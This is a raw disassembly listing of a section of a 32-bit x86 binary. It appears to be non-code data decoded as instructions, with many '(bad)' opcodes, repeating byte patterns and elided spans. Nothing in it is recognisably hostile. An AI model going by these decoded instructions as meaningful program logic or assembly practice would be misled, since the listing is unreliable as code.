  40e639:	(bad)  
  40e63a:	(bad)  
  40e63b:	(bad)  
  40e63c:	(bad)  
  40e63d:	(bad)  
  40e63e:	(bad)  
  40e63f:	(bad)  
  40e640:	(bad)  
  40e641:	(bad)  
  40e642:	(bad)  
  40e643:	(bad)  
  40e644:	(bad)  
  40e645:	(bad)  
  40e646:	(bad)  
  40e647:	(bad)  
  40e648:	(bad)  
  40e649:	(bad)  
  40e64a:	(bad)  
  40e64b:	(bad)  
  40e64c:	(bad)  
  40e64d:	(bad)  
  40e64e:	(bad)  
  40e64f:	(bad)  
  40e650:	(bad)  
  40e651:	(bad)  
  40e652:	(bad)  
  40e653:	(bad)  
  40e654:	(bad)  
  40e655:	(bad)  
  40e656:	(bad)  
  40e657:	(bad)  
  40e658:	(bad)  
  40e659:	(bad)  
  40e65a:	(bad)  
  40e65b:	(bad)  
  40e65c:	(bad)  
  40e65d:	(bad)  
  40e65e:	(bad)  
  40e65f:	(bad)  
  40e660:	(bad)  
  40e661:	(bad)  
  40e662:	(bad)  
  40e663:	(bad)  
  40e664:	(bad)  
  40e665:	(bad)  
  40e666:	(bad)  
  40e667:	(bad)  
  40e668:	(bad)  
  40e669:	(bad)  
  40e66a:	(bad)  
  40e66b:	(bad)  
  40e66c:	(bad)  
  40e66d:	(bad)  
  40e66e:	(bad)  
  40e66f:	(bad)  
  40e670:	(bad)  
  40e671:	(bad)  
  40e672:	(bad)  
  40e673:	(bad)  
  40e674:	(bad)  
  40e675:	(bad)  
  40e676:	(bad)  
  40e677:	(bad)  
  40e678:	mov    ecx,0xff7f9d
	...
  40e68d:	add    BYTE PTR [eax],al
  40e68f:	add    BYTE PTR [edx-0x5dbadb97],ah
  40e695:	imul   esp,DWORD PTR [ebx+ebp*4],0xff2469a2
  40e69c:	lods   al,BYTE PTR ds:[esi]
  40e69d:	jl     0x40e6e0
  40e69f:	inc    eax
  40e6a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6a2:	cmp    edi,0xffc0cdd5
  40e6a8:	xlat   BYTE PTR ds:[ebx]
  40e6a9:	rol    esi,1
  40e6ab:	(bad)  
  40e6ac:	mov    eax,0xa7ff6f98
  40e6b1:	jns    0x40e6f4
  40e6b3:	call   FWORD PTR [ebx-0x6500db9c]
  40e6b9:	fs and al,0xab
  40e6bc:	cwde   
  40e6bd:	arpl   WORD PTR [eax*2+0x0],sp
	...
  40e6d8:	mov    ecx,0xb9ff7f9d
  40e6dd:	popf   
  40e6de:	jg     0x40e6df
  40e6e0:	mov    ecx,0xb9ff7f9d
  40e6e5:	popf   
  40e6e6:	jg     0x40e6e7
  40e6e8:	mov    ecx,0xb9ff7f9d
  40e6ed:	popf   
  40e6ee:	jg     0x40e6ef
  40e6f0:	mov    ecx,0xb9ff7f9d
  40e6f5:	popf   
  40e6f6:	jg     0x40e6f7
  40e6f8:	mov    ecx,0xb9ff7f9d
  40e6fd:	popf   
  40e6fe:	jg     0x40e6ff
  40e700:	mov    ecx,0xb9ff7f9d
  40e705:	popf   
  40e706:	jg     0x40e707
  40e708:	mov    ecx,0xb9ff7f9d
  40e70d:	popf   
  40e70e:	jg     0x40e70f
  40e710:	mov    ecx,0xb9ff7f9d
  40e715:	popf   
  40e716:	jg     0x40e717
  40e718:	mov    ecx,0xb9ff7f9d
  40e71d:	popf   
  40e71e:	jg     0x40e71f
  40e720:	mov    ecx,0xb9ff7f9d
  40e725:	popf   
  40e726:	jg     0x40e727
  40e728:	mov    ecx,0xb9ff7f9d
  40e72d:	popf   
  40e72e:	jg     0x40e72f
  40e730:	mov    ecx,0xb9ff7f9d
  40e735:	popf   
  40e736:	jg     0x40e737
  40e738:	mov    ecx,0xff7f9d
	...
  40e751:	add    BYTE PTR [eax],al
  40e753:	add    BYTE PTR [edx-0x5df5db97],ah
  40e759:	imul   esp,DWORD PTR [esi+edx*2],0x972469a2
  40e760:	mov    ds:0xa2cd2469,al
  40e765:	imul   esp,DWORD PTR [ecx+esi*8],0xf12468a0
  40e76c:	lahf   
  40e76d:	push   0x669ecd24
  40e772:	and    al,0x97
  40e774:	popf   
  40e775:	gs and al,0x56
  40e778:	fwait
  40e779:	gs and al,0xa
	...
  40e798:	mov    ecx,0xb9ff7f9d
  40e79d:	popf   
  40e79e:	jg     0x40e79f
  40e7a0:	mov    ecx,0xb9ff7f9d
  40e7a5:	popf   
  40e7a6:	jg     0x40e7a7
  40e7a8:	mov    ecx,0xb9ff7f9d
  40e7ad:	popf   
  40e7ae:	jg     0x40e7af
  40e7b0:	mov    ecx,0xb9ff7f9d
  40e7b5:	popf   
  40e7b6:	jg     0x40e7b7
  40e7b8:	mov    ecx,0xb9ff7f9d
  40e7bd:	popf   
  40e7be:	jg     0x40e7bf
  40e7c0:	mov    ecx,0xb9ff7f9d
  40e7c5:	popf   
  40e7c6:	jg     0x40e7c7
  40e7c8:	mov    ecx,0xb9ff7f9d
  40e7cd:	popf   
  40e7ce:	jg     0x40e7cf
  40e7d0:	mov    ecx,0xb9ff7f9d
  40e7d5:	popf   
  40e7d6:	jg     0x40e7d7
  40e7d8:	mov    ecx,0xb9ff7f9d
  40e7dd:	popf   
  40e7de:	jg     0x40e7df
  40e7e0:	mov    ecx,0xb9ff7f9d
  40e7e5:	popf   
  40e7e6:	jg     0x40e7e7
  40e7e8:	mov    ecx,0xb9ff7f9d
  40e7ed:	popf   
  40e7ee:	jg     0x40e7ef
  40e7f0:	mov    ecx,0xb9ff7f9d
  40e7f5:	popf   
  40e7f6:	jg     0x40e7f7
  40e7f8:	mov    ecx,0xff7f9d
	...
  40e8bd:	add    BYTE PTR [eax],al
  40e8bf:	add    bh,bh
  40e8c1:	(bad)  
  40e8c2:	(bad)  
  40e8c3:	(bad)  
  40e8c4:	(bad)  
  40e8c5:	inc    DWORD PTR [eax]
  40e8c7:	add    bh,bh
  40e8c9:	(bad)  
  40e8ca:	(bad)  
  40e8cb:	inc    eax
  40e8cd:	mov    edi,0xffff0000
  40e8d2:	(bad)  
  40e8d3:	inc    DWORD PTR [eax-0xffff01]
  40e8d9:	(bad)  
  40e8da:	(bad)  
  40e8db:	inc    DWORD PTR [eax-0xffff01]
  40e8e1:	(bad)  
  40e8e2:	(bad)  
  40e8e3:	inc    DWORD PTR [eax]
  40e8e5:	inc    DWORD PTR [eax]
  40e8e7:	add    bh,bh
  40e8e9:	(bad)  
  40e8ea:	(bad)  
  40e8eb:	inc    DWORD PTR [eax]
  40e8ed:	inc    DWORD PTR [eax]
  40e8ef:	add    al,bh
  40e8f1:	add    edi,edi
  40e8f3:	inc    BYTE PTR [ecx]
  40e8f5:	inc    DWORD PTR [eax]
  40e8f7:	add    al,dh
  40e8f9:	add    bh,bh
  40e8fb:	inc    BYTE PTR [ecx]
  40e8fd:	inc    DWORD PTR [eax]
  40e8ff:	add    al,ah
  40e901:	add    BYTE PTR [ebp-0x4],bh
  40e904:	add    edi,edi
  40e906:	add    BYTE PTR [eax],al
  40e908:	rol    BYTE PTR [eax],0x3c
  40e90b:	mov    esp,0xff02
  40e910:	add    BYTE PTR [eax],0x1c
  40e913:	pop    eax
  40e914:	pop    es
  40e915:	inc    DWORD PTR [eax]
  40e917:	add    BYTE PTR [eax+0x7381c00],al
  40e91d:	inc    DWORD PTR [eax]
  40e91f:	add    BYTE PTR [eax+0xf101c00],al
  40e925:	inc    DWORD PTR [eax]
  40e927:	add    BYTE PTR [eax+0x7001c00],al
  40e92d:	inc    DWORD PTR [eax]
  40e92f:	add    BYTE PTR [eax+0x1f001c00],al
  40e935:	inc    DWORD PTR [eax]
  40e937:	add    BYTE PTR [eax+0x1f001c00],al
  40e93d:	inc    DWORD PTR [eax]
  40e93f:	add    BYTE PTR [eax+0x1c00],al
  40e945:	pop    ds
  40e946:	add    BYTE PTR [eax],al
  40e948:	add    BYTE PTR [eax],0x1c
  40e94b:	add    BYTE PTR [eax],al
  40e94d:	pop    ds
  40e94e:	add    BYTE PTR [eax],al
  40e950:	add    BYTE PTR [eax],0x1c
  40e953:	add    BYTE PTR [eax],al
  40e955:	pop    ds
  40e956:	add    BYTE PTR [eax],al
  40e958:	add    BYTE PTR [eax],0x1c
  40e95b:	add    BYTE PTR [eax],al
  40e95d:	jg     0x40e95f
  40e95f:	add    al,al
  40e961:	add    BYTE PTR [eax+eax*1],bh
  40e964:	add    BYTE PTR [edi+0x0],bh
  40e967:	add    al,ah
  40e969:	add    BYTE PTR [eax+eax*1+0x0],bh
  40e96d:	inc    DWORD PTR [eax]
  40e96f:	add    al,dh
  40e971:	add    ah,bh
  40e973:	add    BYTE PTR [ebx],al
  40e975:	inc    DWORD PTR [eax]
  40e977:	add    al,bh
  40e979:	add    esp,edi
  40e97b:	add    BYTE PTR [ebx],al
  40e97d:	inc    DWORD PTR [eax]
  40e97f:	add    bh,bh
  40e981:	(bad)  
  40e982:	cld    
  40e983:	add    BYTE PTR [edi],cl
  40e985:	inc    DWORD PTR [eax]
  40e987:	add    bh,bh
  40e989:	(bad)  
  40e98a:	cld    
  40e98b:	add    BYTE PTR [edi],cl
  40e98d:	inc    DWORD PTR [eax]
  40e98f:	add    bh,bh
  40e991:	(bad)  
  40e992:	cld    
  40e993:	add    BYTE PTR [edi],bh
  40e995:	inc    DWORD PTR [eax]
  40e997:	add    bh,bh
  40e999:	(bad)  
  40e99a:	cld    
  40e99b:	add    BYTE PTR [edi],bh
  40e99d:	inc    DWORD PTR [eax]
  40e99f:	add    bh,bh
  40e9a1:	(bad)  
  40e9a2:	cld    
  40e9a3:	add    BYTE PTR [edi-0x1],bh
  40e9a6:	add    BYTE PTR [eax],al
  40e9a8:	clc    
  40e9a9:	add    esp,edi
  40e9ab:	add    BYTE PTR [eax],al
  40e9ad:	add    DWORD PTR [eax],eax
  40e9af:	add    al,dh
  40e9b1:	add    ah,bh
  40e9b3:	add    BYTE PTR [eax],al
  40e9b5:	add    DWORD PTR [eax],eax
  40e9b7:	add    al,ah
  40e9b9:	add    BYTE PTR [eax+eax*1+0x0],bh
  40e9bd:	add    DWORD PTR [eax],eax
  40e9bf:	add    al,al
  40e9c1:	add    BYTE PTR [eax+eax*1],bh
  40e9c4:	add    BYTE PTR [ecx],al
  40e9c6:	add    BYTE PTR [eax],al
  40e9c8:	add    BYTE PTR [eax],0x1c
  40e9cb:	add    BYTE PTR [eax],al
  40e9cd:	add    DWORD PTR [eax],eax
  40e9cf:	add    BYTE PTR [eax+0x1c00],al
  40e9d5:	add    DWORD PTR [eax],eax
  40e9d7:	add    BYTE PTR [eax+0x1c00],al
  40e9dd:	add    DWORD PTR [eax],eax
  40e9df:	add    BYTE PTR [eax+0x1c00],al
  40e9e5:	add    DWORD PTR [eax],eax
  40e9e7:	add    BYTE PTR [eax+0x1c00],al
  40e9ed:	add    DWORD PTR [eax],eax
  40e9ef:	add    BYTE PTR [eax+0x1c00],al
  40e9f5:	add    DWORD PTR [eax],eax
  40e9f7:	add    BYTE PTR [eax+0x1c00],al
  40e9fd:	add    DWORD PTR [eax],eax
  40e9ff:	add    BYTE PTR [eax+0x1c00],al
  40ea05:	add    DWORD PTR [eax],eax
  40ea07:	add    BYTE PTR [eax+0x1c00],al
  40ea0d:	add    DWORD PTR [eax],eax
  40ea0f:	add    BYTE PTR [eax+0x1c00],al
  40ea15:	add    DWORD PTR [eax],eax
  40ea17:	add    al,al
  40ea19:	add    BYTE PTR [eax+eax*1],bh
  40ea1c:	add    BYTE PTR [ecx],al
  40ea1e:	add    BYTE PTR [eax],al
  40ea20:	loopne 0x40ea22
  40ea22:	jl     0x40ea24
  40ea24:	add    BYTE PTR [ecx],al
  40ea26:	add    BYTE PTR [eax],al
  40ea28:	lock add ah,bh
  40ea2b:	add    BYTE PTR [eax],al
  40ea2d:	add    DWORD PTR [eax],eax
  40ea2f:	add    al,bh
  40ea31:	add    esp,edi
  40ea33:	add    BYTE PTR [eax],al
  40ea35:	add    DWORD PTR [eax],eax
  40ea37:	add    bh,bh
  40ea39:	(bad)  
  40ea3a:	(bad)  
  40ea3b:	(bad)  
  40ea3c:	(bad)  
  40ea3d:	inc    DWORD PTR [eax]
  40ea3f:	add    BYTE PTR [eax],ch
  40ea41:	add    BYTE PTR [eax],al
  40ea43:	add    BYTE PTR [eax],ch
  40ea45:	add    BYTE PTR [eax],al
  40ea47:	add    BYTE PTR [eax+0x0],dl
  40ea4a:	add    BYTE PTR [eax],al
  40ea4c:	add    DWORD PTR [eax],eax
  40ea4e:	and    BYTE PTR [eax],al
  40ea50:	add    BYTE PTR [eax],al
  40ea52:	add    BYTE PTR [eax],al
  40ea54:	inc    eax
  40ea55:	sbb    al,BYTE PTR [eax]
	...
  40ead7:	add    BYTE PTR [ebx-0x5ffaa983],ah
  40eadd:	jns    0x40eb30
  40eadf:	and    al,0xa0
  40eae1:	jns    0x40eb33
  40eae3:	sub    ah,BYTE PTR [eax-0x5fd5af87]
  40eae9:	jns    0x40eb3b
  40eaeb:	sub    ah,BYTE PTR [esi+edi*2+0xe57]
	...
  40eb72:	add    BYTE PTR [eax],al
  40eb74:	mov    ds:0x9307577d,eax
  40eb79:	ins    BYTE PTR es:[edi],dx
  40eb7a:	inc    ecx
  40eb7b:	push   edx
  40eb7c:	xchg   edi,eax
  40eb7d:	outs   dx,BYTE PTR ds:[esi]
  40eb7e:	inc    edx
  40eb7f:	out    0x99,eax
  40eb81:	outs   dx,DWORD PTR ds:[esi]
  40eb82:	inc    ebx
  40eb83:	call   FWORD PTR [ecx-0x7100bc92]
  40eb89:	bound  esi,QWORD PTR [edi+edi*8]
  40eb8c:	pushf  
  40eb8d:	je     0x40ebda
  40eb8f:	push   esp
	...
  40ec14:	popf   
  40ec15:	ja     0x40ec66
  40ec17:	sub    BYTE PTR [ecx-0x433bcea1],cl
  40ec1d:	xchg   esi,eax
  40ec1e:	je     0x40ec1f
  40ec20:	(bad)  
  40ec21:	mov    al,ds:0xa0c6ff81
  40ec26:	cmp    bh,0xa4
  40ec29:	jnp    0x40ec7d
  40ec2b:	call   FWORD PTR [esi+0x544c76]
	...
  40ecad:	add    BYTE PTR [eax],al
  40ecaf:	add    BYTE PTR [esi-0x6df5a480],ah
  40ecb5:	push   0x3f
  40ecb7:	ja     0x40ec56
  40ecb9:	jne    0x40ed08
  40ecbb:	out    dx,eax
  40ecbc:	ret    
  40ecbd:	sahf   
  40ecbe:	jle    0x40ecbf
  40ecc0:	enter  0x84a3,0xff
  40ecc4:	mov    eax,0x93ff6e92
  40ecc9:	imul   edi,DWORD PTR [edi],0xffffffd0
  40eccc:	mov    ds:0x35547b,al
	...
  40ed4d:	add    BYTE PTR [eax],al
  40ed4f:	add    BYTE PTR [edi+edi*2+0x648c225a],ah
  40ed56:	cmp    BYTE PTR [ebx-0x95734e],dh
  40ed5c:	retf   0x89a6
  40ed5f:	dec    ecx
  40ed61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed62:	xchg   edi,edi
  40ed64:	mov    dl,0x8c
  40ed66:	dec    DWORD PTR [bp+di+0x3563]
  40ed6b:	pushf  
  40ed6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed6d:	jle    0x40edc7
  40ed6f:	adc    eax,DWORD PTR [eax]
	...
  40ed91:	add    BYTE PTR [eax],al
  40ed93:	add    cl,cl
  40ed95:	mov    ch,0x9b
  40ed97:	pop    es
  40ed98:	xchg   edi,eax
  40ed99:	imul   esi,DWORD PTR [esi],0x20
  40ed9c:	lea    ebx,[ebp+0x25]
  40ed9f:	jnp    0x40ed33
  40eda1:	xor    DWORD PTR fs:[edi-0x1bc2926a],esi
  40eda8:	cwde   
  40eda9:	jno    0x40edee
  40edab:	repz xchg edx,eax
  40edad:	imul   edi,DWORD PTR [edx],0x2c5e89da
  40edb3:	lahf   
  40edb4:	test   BYTE PTR [edi+0x24],dl
  40edb7:	pop    eax
  40edb8:	mov    ds:0xc9185b81,al
  40edbd:	mov    dh,0xa1
  40edbf:	add    eax,DWORD PTR [eax]
	...
  40ede9:	add    BYTE PTR [eax],al
  40edeb:	add    BYTE PTR [edx-0x70f69c79],ch
  40edf1:	push   0x7da37b3c
  40edf6:	push   esi
  40edf7:	dec    eax
  40edf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edfa:	mov    bh,bh
  40edfc:	int3   
  40edfd:	stos   BYTE PTR es:[edi],al
  40edfe:	mov    ?,edi
  40ee00:	rcr    BYTE PTR [esp+edi*2+0x33628aff],0xcc
  40ee08:	mov    al,ds:0x33547a
	...
  40ee2d:	add    BYTE PTR [eax],al
  40ee2f:	add    ch,al
  40ee31:	scas   al,BYTE PTR es:[edi]
  40ee32:	xchg   ebx,eax
  40ee33:	push   cs
  40ee34:	mov    al,ds:0x90574275
  40ee39:	pop    esi
  40ee3a:	and    edi,DWORD PTR [ecx-0xa17856]
  40ee40:	int3   
  40ee41:	mov    bh,0x9f
  40ee43:	(bad)  
  40ee44:	out    0xdd,al
  40ee46:	sar    dh,cl
  40ee48:	repz out dx,eax
  40ee4a:	jmp    0xbcff:0xc4d2deff
  40ee51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee52:	mov    bh,bh
  40ee54:	xchg   esi,eax
  40ee55:	jo     0x40ee9b
  40ee57:	in     al,dx
  40ee58:	adc    DWORD PTR [esi+0x23],0xffffff9e
  40ee5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee5d:	test   DWORD PTR [eax+0x3a],esp
  40ee60:	retf   0xa2b7
  40ee63:	add    al,0x0
	...
  40ee6d:	add    BYTE PTR [eax],al
  40ee6f:	add    BYTE PTR [ebp-0x4ec79271],ch
  40ee75:	xchg   ebx,eax
  40ee76:	je     0x40ee86
	...
  40ee8c:	mov    ds:0x9427597f,eax
  40ee91:	ins    DWORD PTR es:[edi],dx
  40ee92:	inc    ebx
  40ee93:	shl    BYTE PTR [ebp-0x30008f6e],0xae
  40ee9a:	xchg   ebx,eax
  40ee9b:	dec    ebp
  40ee9d:	lods   eax,DWORD PTR ds:[esi]
  40ee9e:	xchg   edx,eax
  40ee9f:	jmp    FWORD PTR [edi-0x6f089976]
  40eea5:	imul   edi,DWORD PTR ds:0x5a80a595,0xf
	...
  40eecb:	add    bl,al
  40eecd:	lods   al,BYTE PTR ds:[esi]
  40eece:	nop
  40eecf:	or     esp,DWORD PTR [ecx+edi*2+0x60945c45]
  40eed6:	and    ecx,esi
  40eed8:	mov    ch,0x97
  40eeda:	jae    0x40eed7
  40eedc:	out    0xe2,eax
  40eede:	(bad)  
  40eee0:	clc    
  40eee1:	div    edi
  40eee3:	(bad)  
  40eee4:	sti    
  40eee5:	sti    
  40eee6:	sti    
  40eee7:	(bad)  
  40eee8:	cld    
  40eee9:	cld    
  40eeea:	cld    
  40eeeb:	(bad)  
  40eeec:	cld    
  40eeed:	cld    
  40eeee:	cld    
  40eeef:	(bad)  
  40eef0:	clc    
  40eef1:	div    ah
  40eef3:	(bad)  
  40eef4:	fcmove st,st(5)
  40eef6:	mov    esi,0x567d9ffe
  40eefb:	hlt    
  40eefc:	adc    DWORD PTR [esi+0x23],0xffffffb2
  40ef00:	mov    ds:0x355c82,eax
	...
  40ef0d:	add    BYTE PTR [eax],al
  40ef0f:	add    BYTE PTR [edi-0x6456b78e],dl
  40ef15:	jne    0x40ef62
  40ef17:	xchg   edx,eax
  40ef18:	add    BYTE PTR [eax],al
  40ef1a:	add    BYTE PTR [eax],al
  40ef1c:	mov    dh,0x97
  40ef1e:	js     0x40ef22
	...
  40ef2c:	xchg   ecx,eax
  40ef2d:	push   0x40
  40ef2f:	ins    DWORD PTR es:[edi],dx
  40ef30:	mov    al,ds:0xccfe557c
  40ef35:	lods   eax,DWORD PTR ds:[esi]
  40ef36:	xchg   edx,eax
  40ef37:	(bad)  
  40ef38:	shl    BYTE PTR [ecx-0x4f300169],1
  40ef3e:	xchg   esi,eax
  40ef3f:	dec    BYTE PTR [edx-0x641eca9e]
  40ef45:	jbe    0x40ef95
  40ef47:	xor    eax,0x0
	...
  40ef68:	les    ebp,FWORD PTR [edi+0x77a50193]
  40ef6e:	inc    ecx
  40ef6f:	xor    bl,BYTE PTR [eax-0x4642db9d]
  40ef75:	call   0xffde:0xe2e5fa76
  40ef7c:	repnz repz hlt 
  40ef7f:	push   esi
  40ef81:	div    edi
  40ef83:	(bad)  
  40ef84:	stc    
  40ef85:	cli    
  40ef86:	cli    
  40ef87:	(bad)  
  40ef88:	cld    
  40ef89:	cld    
  40ef8a:	cld    
  40ef8b:	(bad)  
  40ef8c:	std    
  40ef8d:	std    
  40ef8e:	std    
  40ef8f:	(bad)  
  40ef90:	std    
  40ef91:	std    
  40ef92:	std    
  40ef93:	(bad)  
  40ef94:	cld    
  40ef95:	sti    
  40ef96:	sti    
  40ef97:	jmp    esp
  40ef99:	fcmovbe st,st(0)
  40ef9b:	call   FWORD PTR [ebp-0x7b0aaf87]
  40efa1:	push   edi
  40efa2:	and    al,0x9a
  40efa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efa5:	sbb    DWORD PTR [esi+0x5],0x0
  40efa9:	add    BYTE PTR [eax],al
  40efab:	add    BYTE PTR [eax],al
  40efad:	add    BYTE PTR [eax],al
  40efaf:	add    BYTE PTR [ecx-0x4a55b48c],bl
  40efb5:	xchg   esp,eax
  40efb6:	jae    0x40efb5
  40efb8:	mov    ds:0xba825980,eax
  40efbd:	popf   
  40efbe:	jg     0x40efc2
  40efc0:	mov    ebx,0x17f9d
  40efc5:	add    BYTE PTR [eax],al
  40efc7:	add    BYTE PTR [ebx-0x6ae6a480],ah
  40efcd:	jo     0x40f016
  40efcf:	fdivr  DWORD PTR [ebx-0x2b008465]
  40efd5:	mov    dh,0x9e
  40efd7:	call   ebx
  40efd9:	mov    ch,0x9c
  40efdb:	jmp    FWORD PTR [ebx-0x6c009c79]
  40efe1:	ins    DWORD PTR es:[edi],dx
  40efe2:	inc    ebx
  40efe3:	mov    DWORD PTR [ecx+ecx*4+0xa66],ebp
	...
  40f006:	add    BYTE PTR [eax],al
  40f008:	ret    0x8dab
  40f00b:	or     al,0x9c
  40f00d:	gs and al,0x81
  40f010:	scas   eax,DWORD PTR es:[edi]
  40f011:	mov    bl,BYTE PTR [eax+edi*8-0x26]
  40f015:	aad    0xcb
  40f017:	(bad)  
  40f018:	call   0xee40db08
  40f01d:	out    dx,eax
  40f01e:	lock push ecx
  40f021:	repz repz push esi
  40f025:	div    edi
  40f027:	(bad)  
  40f028:	cli    
  40f029:	cli    
  40f02a:	cli    
  40f02b:	(bad)  
  40f02c:	cld    
  40f02d:	cld    
  40f02e:	cld    
  40f02f:	(bad)  
  40f030:	std    
  40f031:	std    
  40f032:	std    
  40f033:	(bad)  
  40f034:	std    
  40f035:	std    
  40f036:	std    
  40f037:	(bad)  
  40f038:	cld    
  40f039:	sti    
  40f03a:	sti    
  40f03b:	(bad)  
  40f03c:	fxch   st(4)
  40f03e:	mov    ebp,0x386790ff
  40f043:	pause  
  40f045:	cmp    DWORD PTR [di],edi
	...
  40f050:	call   0x9bb3:0xcdaa4d75
  40f057:	inc    esp
  40f059:	test   al,0x8c
  40f05b:	lock pushf 
  40f05d:	jne    0x40f0aa
  40f05f:	jge    0x40f061
  40f061:	add    BYTE PTR [eax],al
  40f063:	add    BYTE PTR [eax],al
  40f065:	add    BYTE PTR [eax],al
  40f067:	add    BYTE PTR [ecx-0x63a9b28b],bl
  40f06d:	js     0x40f0c0
  40f06f:	call   esp
  40f071:	mov    eax,0xbad6ffa1
  40f076:	mov    ds:0xa1b8d5ff,al
  40f07b:	call   FWORD PTR [ecx-0x6700b48c]
  40f081:	jae    0x40f0cd
  40f083:	das    
	...
  40f0a8:	ret    0x8baa
  40f0ab:	sbb    ah,BYTE PTR [edi-0x3140c088]
  40f0b1:	shr    BYTE PTR [edi+edi*8-0x1a191e],0xe4
  40f0b9:	call   0xec2af0a6
  40f0be:	jmp    0x40f0bf
  40f0c0:	in     al,dx
  40f0c1:	out    dx,eax
  40f0c2:	out    dx,eax
  40f0c3:	push   ecx
  40f0c5:	repz repz (bad) 
  40f0c8:	div    bh
  40f0ca:	idiv   edi
  40f0cc:	stc    
  40f0cd:	cli    
  40f0ce:	cli    
  40f0cf:	(bad)  
  40f0d0:	cld    
  40f0d1:	cld    
  40f0d2:	cld    
  40f0d3:	(bad)  
  40f0d4:	std    
  40f0d5:	std    
  40f0d6:	std    
  40f0d7:	(bad)  
  40f0d8:	std    
  40f0d9:	std    
  40f0da:	std    
  40f0db:	(bad)  
  40f0dc:	sti    
  40f0dd:	cli    
  40f0de:	stc    
  40f0df:	dec    eax
  40f0e1:	mov    dh,0xa2
  40f0e3:	call   DWORD PTR [ecx+0x853a67]
  40f0e9:	add    BYTE PTR [eax],al
  40f0eb:	add    BYTE PTR [eax],al
  40f0ed:	add    BYTE PTR [eax],al
  40f0ef:	add    BYTE PTR [edx-0x2f55b089],bl
  40f0f5:	mov    bh,0xa0
  40f0f7:	(bad)  
  40f0f8:	(bad)  
  40f0fa:	mov    bh,0xff
  40f0fc:	leave  
  40f0fd:	lods   eax,DWORD PTR ds:[esi]
  40f0fe:	xchg   ebx,eax
  40f0ff:	imul   DWORD PTR [esi-0x60799875]
  40f105:	jl     0x40f15d
  40f107:	inc    edi
  40f108:	xchg   ebx,eax
  40f109:	outs   dx,BYTE PTR ds:[esi]
  40f10a:	inc    esi
  40f10b:	jecxz  0x40f0d4
  40f10d:	stos   BYTE PTR es:[edi],al
  40f10e:	(bad)  
  40f10f:	(bad)  
  40f110:	fnstcw WORD PTR [edi-0x41280056]
  40f116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f117:	jmp    DWORD PTR [edi-0x6e009e7a]
  40f11d:	imul   eax,DWORD PTR [ecx-0x80],0x0
	...
  40f145:	add    BYTE PTR [eax],al
  40f147:	add    cl,al
  40f149:	test   eax,0x85af2489
  40f14e:	push   ecx
  40f14f:	in     eax,0xd8
  40f151:	aam    0xca
  40f153:	jmp    ebx
  40f155:	out    0xe7,eax
  40f157:	jmp    ebx
  40f159:	out    0xe7,eax
  40f15b:	jmp    ebp
  40f15d:	call   0xec29f14a
  40f162:	jmp    0x40f163
  40f164:	in     al,dx
  40f165:	out    dx,al
  40f166:	out    dx,eax
  40f167:	(bad)  
  40f168:	icebp  
  40f169:	repnz repz push esi
  40f16d:	div    bh
  40f16f:	(bad)  
  40f170:	cli    
  40f171:	cli    
  40f172:	cli    
  40f173:	(bad)  
  40f174:	cld    
  40f175:	cld    
  40f176:	cld    
  40f177:	(bad)  
  40f178:	std    
  40f179:	std    
  40f17a:	std    
  40f17b:	(bad)  
  40f17c:	std    
  40f17d:	std    
  40f17e:	std    
  40f17f:	jmp    esp
  40f181:	(bad)  
  40f183:	call   DWORD PTR [edx+0xb43968]
  40f189:	add    BYTE PTR [eax],al
  40f18b:	add    BYTE PTR [eax],al
  40f18d:	add    BYTE PTR [eax],al
  40f18f:	add    BYTE PTR [ebx-0x2d55ae88],bl
  40f195:	mov    edx,0xcce0ffa5
  40f19a:	mov    esp,0xb9cbdfff
  40f19f:	inc    ebx
  40f1a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1a2:	mov    esi,eax
  40f1a4:	popf   
  40f1a5:	js     0x40f1f7
  40f1a7:	mov    bh,0xa9
  40f1a9:	mov    BYTE PTR [ebp-0x11],ah
  40f1ac:	fadd   st(4),st
  40f1ae:	mov    cl,0xff
  40f1b0:	fcmovnb st,st(3)
  40f1b2:	scas   al,BYTE PTR es:[edi]
  40f1b3:	dec    esi
  40f1b5:	mov    bl,0x9b
  40f1b7:	jmp    DWORD PTR [ecx-0x6020a682]
  40f1bd:	jl     0x40f215
  40f1bf:	cmp    al,0xbf
  40f1c1:	mov    eax,ds:0x185
	...
  40f1e6:	add    BYTE PTR [eax],al
  40f1e8:	shr    DWORD PTR [eax-0x734cd779],0x5c
  40f1ef:	cmc    
  40f1f0:	(bad)  
  40f1f2:	(bad)  
  40f1f4:	jecxz  0x40f1dd
  40f1f6:	out    0xff,eax
  40f1f8:	jecxz  0x40f1e1
  40f1fa:	out    0xff,eax
  40f1fc:	jecxz  0x40f1e5
  40f1fe:	out    0xff,eax
  40f200:	in     al,0xe8
  40f202:	call   0xec2cdb06
  40f207:	(bad)  
  40f208:	in     al,dx
  40f209:	out    dx,eax
  40f20a:	out    dx,eax
  40f20b:	push   ecx
  40f20d:	repz repz push esi
  40f211:	div    edi
  40f213:	(bad)  
  40f214:	stc    
  40f215:	cli    
  40f216:	cli    
  40f217:	(bad)  
  40f218:	cld    
  40f219:	cld    
  40f21a:	cld    
  40f21b:	(bad)  
  40f21c:	std    
  40f21d:	std    
  40f21e:	std    
  40f21f:	(bad)  
  40f220:	in     al,dx
  40f221:	in     eax,dx
  40f222:	jmp    0x40f223
  40f224:	xchg   ebx,eax
  40f225:	imul   edi,DWORD PTR [ecx],0xc8
  40f22b:	add    BYTE PTR [eax],al
  40f22d:	add    BYTE PTR [eax],al
  40f22f:	add    BYTE PTR [edx+edi*2-0x412b55ae],bl
  40f236:	stos   BYTE PTR es:[edi],al
  40f237:	jmp    ebx
  40f239:	rol    al,1
  40f23b:	jmp    edx
  40f23d:	into   
  40f23e:	mov    esi,0xbccde1ff
  40f243:	dec    ebp
  40f245:	mov    dl,0x9a
  40f247:	(bad)  
  40f248:	fadd   st,st(1)
  40f24a:	lods   eax,DWORD PTR ds:[esi]
  40f24b:	(bad)  
  40f24c:	fmulp  st(0),st
  40f24e:	mov    dh,0xff
  40f250:	ffree  st(6)
  40f252:	mov    bl,0xff
  40f254:	mov    eax,0x92ff7d9a
  40f259:	ins    DWORD PTR es:[edi],dx
